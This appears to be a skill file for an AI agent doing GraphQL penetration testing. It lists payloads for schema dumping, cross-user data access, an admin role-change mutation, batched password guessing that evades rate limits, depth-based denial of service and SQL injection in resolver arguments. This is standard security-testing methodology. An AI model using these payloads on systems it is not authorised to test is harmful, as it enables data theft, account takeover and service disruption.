---
name: graphql-methodology
description: "GraphQL security testing: introspection, field suggestion abuse, batching, depth attacks, and authorization gaps at the resolver level. Use this skill when an API exposes GraphQL."
---

# GraphQL

## Overview

GraphQL exposes a typed schema. Even with introspection disabled, field suggestions leak it. Authorization must be enforced per resolver, and it often is not.

## Endpoint discovery

```
/graphql  /api/graphql  /v1/graphql  /query  /gql
```

```bash
curl -s -X POST https://target/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'
```

## Introspection

```graphql
{ __schema { types { name fields { name } } } }
```

```bash
# full dump
pip install graphql-cop
graphql-cop -t https://target/graphql
# or
python3 -c "
import requests, json
q = '{__schema{queryType{name} types{name kind fields{name type{name kind ofType{name}}}}}}'
print(json.dumps(requests.post('https://target/graphql', json={'query': q}).json(), indent=1))
"
```

## When introspection is disabled

Field suggestions:

```graphql
{ usr }
# "Did you mean 'user'?"
```

Use `clairvoyance`:

```bash
python3 clairvoyance.py -u https://target/graphql -o schema.json
```

## Authorization testing

Query objects belonging to another user:

```graphql
{ user(id: 2) { email role } }
{ node(id: "base64") { ... on User { email } } }
```

Mutations too:

```graphql
mutation { updateUser(id: 2, role: ADMIN) { id } }
```

## Batching and rate limits

```json
[
  {"query": "{ login(user:\"a\",pass:\"1\") { token } }"},
  {"query": "{ login(user:\"a\",pass:\"2\") { token } }"}
]
```

Array batching bypasses per-request rate limits. Aliases do the same in one query:

```graphql
{ a: login(user:"a",pass:"1"){token} b: login(user:"a",pass:"2"){token} }
```

## Depth / complexity DoS

```graphql
{ user { friends { friends { friends { friends { id } } } } } }
```

Test the maximum depth and whether cost analysis exists.

## Injection into resolvers

Arguments flow into SQL/NoSQL/REST calls:

```graphql
{ user(name: "a' OR 1=1--") { id } }
```

## Subscription abuse

WebSocket subscriptions may skip auth checks applied to queries.

## Pitfalls

- Introspection disabled is not a security control — suggestions leak the schema.
- Errors expose stack traces and internal types; read them.
- Persisted queries may limit what you can send.

## Verification

Data belonging to another user must be returned, or a mutation must change state without authorization.
